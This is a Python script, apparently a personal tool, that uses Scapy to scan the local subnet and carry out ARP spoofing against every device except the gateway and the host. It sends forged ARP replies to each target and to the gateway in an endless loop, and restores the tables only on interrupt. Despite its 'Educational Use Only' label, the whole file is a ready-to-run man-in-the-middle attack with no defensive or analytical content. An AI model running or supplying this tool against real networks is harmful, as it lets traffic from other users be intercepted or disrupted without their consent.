#!/usr/bin/env python3
"""
ARP Spoofing Tool (Educational Use Only)
Author: Tim
Auto-spoofs all devices on network except gateway and self.
"""

import os
import sys
import time
import logging
import subprocess
from scapy.all import ARP, Ether, sendp, srp, conf, get_if_addr

# Configuration
INTERFACE = "wlp3s0"
SLEEP_TIME = 2
LOG_FILE = "arp_spoof.log"

# Logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler()]
)

def check_root():
    if os.geteuid() != 0:
        logging.error("Run as root (sudo).")
        sys.exit(1)

def get_default_gateway():
    try:
        result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if line.startswith('default'):
                return line.split()[2]
    except:
        pass
    return None

def get_local_ip(interface):
    try:
        return get_if_addr(interface)
    except:
        return None

def get_subnet(ip):
    return '.'.join(ip.split('.')[:3]) + '.0/24'

def get_mac(ip, interface=INTERFACE):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                     timeout=2, iface=interface, verbose=False)
        return ans[0][1].src if ans else None
    except Exception as e:
        logging.error(f"MAC error for {ip}: {e}")
        return None

def scan_network(subnet, interface):
    logging.info(f"Scanning {subnet}...")
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
                     timeout=2, iface=interface, verbose=False)
        devices = [(rcv.psrc, rcv.hwsrc) for _, rcv in ans]
        return devices
    except Exception as e:
        logging.error(f"Scan error: {e}")
        return []

def restore_arp(target_ip, gateway_ip, interface):
    logging.info(f"Restoring ARP table for {target_ip}...")
    target_mac = get_mac(target_ip, interface)
    gateway_mac = get_mac(gateway_ip, interface)
    if target_mac and gateway_mac:
        sendp(Ether(dst=target_mac)/ARP(
            op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip),
            iface=interface, count=5, verbose=False)
        sendp(Ether(dst=gateway_mac)/ARP(
            op=2, psrc=target_ip, hwsrc=target_mac, pdst=gateway_ip),
            iface=interface, count=5, verbose=False)

def restore_all(targets, gateway_ip, interface):
    logging.info("Restoring ARP tables for all targets...")
    for target_ip, _ in targets:
        restore_arp(target_ip, gateway_ip, interface)

def arp_spoof_all(targets, gateway_ip, gateway_mac, interface=INTERFACE):
    logging.info("Starting ARP spoofing on all targets.")
    try:
        while True:
            for target_ip, target_mac in targets:
                # Tell target the gateway is us
                sendp(Ether(dst=target_mac)/ARP(
                    op=2, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip),
                    iface=interface, verbose=False)

                # Tell gateway the target is us
                sendp(Ether(dst=gateway_mac)/ARP(
                    op=2, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip),
                    iface=interface, verbose=False)

            time.sleep(SLEEP_TIME)
    except KeyboardInterrupt:
        logging.info("CTRL+C pressed. Restoring network...")
        restore_all(targets, gateway_ip, interface)

def get_all_targets(subnet, gateway_ip, local_ip, interface):
    devices = scan_network(subnet, interface)
    targets = [(ip, mac) for ip, mac in devices if ip not in (gateway_ip, local_ip)]
    if not targets:
        logging.error("No valid targets found.")
        sys.exit(1)
    logging.info("Discovered targets:")
    for ip, mac in targets:
        logging.info(f"  {ip} ({mac})")
    return targets

def main():
    check_root()
    interface = INTERFACE
    local_ip = get_local_ip(interface)
    gateway_ip = get_default_gateway()

    if not local_ip or not gateway_ip:
        logging.error("Auto-detection failed.")
        sys.exit(1)

    subnet = get_subnet(local_ip)
    gateway_mac = get_mac(gateway_ip, interface)
    if not gateway_mac:
        logging.error("Could not get gateway MAC address.")
        sys.exit(1)

    targets = get_all_targets(subnet, gateway_ip, local_ip, interface)
    conf.iface = interface
    arp_spoof_all(targets, gateway_ip, gateway_mac, interface)

if __name__ == "__main__":
    main()
